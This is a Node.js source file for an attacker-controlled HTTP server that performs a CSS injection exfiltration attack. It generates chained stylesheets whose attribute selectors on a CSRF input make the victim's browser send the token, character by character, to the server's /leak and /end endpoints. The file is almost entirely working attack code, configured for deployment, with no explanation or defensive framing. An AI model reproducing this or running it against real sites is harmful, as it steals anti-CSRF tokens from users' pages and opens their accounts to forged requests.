const http = require('http');
const url = require('url');

// **************************  SETUP  **************************

// SET THIS FOR LISTENER
const PORT = 5001;
const BASE_URL = `http://localhost:${PORT}`;

// SET THIS LIST DEPENDING ON YOUR TREE FROM PARENT > CHILD
const HTML_TAG_LIST = ['body', 'div', 'form', 'input'];

// *************************************************************

// CONSTANTS

// prettier-ignore
const ALPHABET_UPPER = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
const ALPHABET_LOWER = ALPHABET_UPPER.map((c) => c.toLowerCase());
const NUMBERS = [...Array(10).keys()];
const CHAR_LIST = [...ALPHABET_LOWER, ...ALPHABET_UPPER, ...NUMBERS];
const CSS_TAG_LIST = ['background-image', 'list-style-image', 'content', 'border-image-source'];

/**
 * Generate a random integer
 */
const getRandomInt = (max) => {
  return Math.floor(Math.random() * max);
};

/**
 * Generate one css rule
 * @param {*} token Current found token
 * @param {*} nextChar Next char to try
 * @param {*} rnd Random number to make sure browser make request
 * @returns A rule for an input
 */
const cssClassGenerator = (token, nextChar, rnd) => {
  const nextToken = `${token}${nextChar}`;
  return `
        input.csrf[value^="${nextToken}"] {
            --v${rnd}: url(${BASE_URL}/leak?token=${nextToken}&rnd=${rnd});
        }
    `;
};

/**
 * Generate one css file
 * @param {*} token Current found token
 * @param {*} rnd Random number to make sure browser make request
 * @returns Whole css file to send back to client
 */
const cssFileGenerator = (token, rnd) => {
  const header = `@import url(${BASE_URL}/full?token=${token}&rnd=${rnd});`;
  const content = CHAR_LIST.map((char) => cssClassGenerator(token, char, rnd)).join('');

  const footer = `
        ${[...HTML_TAG_LIST].splice(htmlIndex).join(' ')}${pseudoElement} {
            ${pseudoElement ? 'content: "content";' : ''}
            ${CSS_TAG_LIST[cssIndex]}: var(--v${rnd});
        }

        input[value="${token}"] {
            background-image: url(${BASE_URL}/end?token=${token}&rnd=${rnd}) !important;
        }
    `;
  return [header, content, footer].join('\n');
};

// global variable controller
/** Token value send by the leak */
let awaitToken = undefined;
/** Token value final */
let endToken = undefined;
/** Current index in {@link CSS_TAG_LIST} */
let cssIndex = 0;
/** Current slice in {@link HTML_TAG_LIST} */
let htmlIndex = HTML_TAG_LIST.length - 1;
/** "" or "::after" or "::before" */
let pseudoElement = '';

/**
 * Handler for the request server
 */
const requestHandler = async (req, res) => {
  const urlObject = url.parse(req.url, url);
  const { token = '' } = urlObject.query;

  console.log('--- Request incoming', urlObject.pathname, token);

  if (endToken) {
    res.end();
    return;
  }

  // generate random for the css
  const rnd = getRandomInt(1000000);

  switch (urlObject.pathname) {
    // token found stop everything
    case '/end': {
      awaitToken = token;
      endToken = token;

      console.log('\n\n### Final token:', endToken, ' ###\n\n');

      res.end();
      break;
    }
    // first call (link to inject)
    case '/base': {
      const css = cssFileGenerator('', rnd);

      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.write(css);

      res.end();
      break;
    }
    // complete call wating for the leak to call before responding
    case '/full': {
      // wait for token to be set
      console.log('[1] Wating for new token');

      // waiting for /leak to send the new token
      while (awaitToken === undefined) {
        await new Promise((res) => setTimeout(res, 1));
      }
      console.log('[2] Received new token:', awaitToken ? awaitToken : '<empty>');

      // once token is retrieve generate new css to send
      const css = cssFileGenerator(awaitToken, rnd);
      awaitToken = undefined;

      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.write(css);

      console.log('[3] Sending CSS', rnd);

      res.end();
      break;
    }
    // the newly find token to pass
    case '/leak': {
      awaitToken = token;
      // change css property
      cssIndex += 1;
      // skip "content" for pseudo element
      if (CSS_TAG_LIST[cssIndex] === 'content' && !!pseudoElement) {
        cssIndex += 1;
      }
      // once all css property used, change tag and loop again on css properties
      if (cssIndex === CSS_TAG_LIST.length) {
        cssIndex = 0;
        htmlIndex -= 1;
      }
      // once all tags used, change pseudo element and loop again on css properties
      if (htmlIndex < 0) {
        htmlIndex = HTML_TAG_LIST.length - 1;

        if (pseudoElement === '') {
          pseudoElement = '::after';
        } else {
          pseudoElement = '::before';
        }
      }

      res.end();
      break;
    }
    default:
      res.end();
      break;
  }
};

const server = http.createServer(requestHandler);

server.listen(PORT, (err) => {
  if (err) {
    return console.log('[-] Error: something bad happened', err);
  }
  console.log('[+] Server is listening on %d', PORT);
  console.log(
    '[+] Token max length is:',
    CSS_TAG_LIST.length * HTML_TAG_LIST.length + (CSS_TAG_LIST.length - 1) * HTML_TAG_LIST.length * 2
  );
});
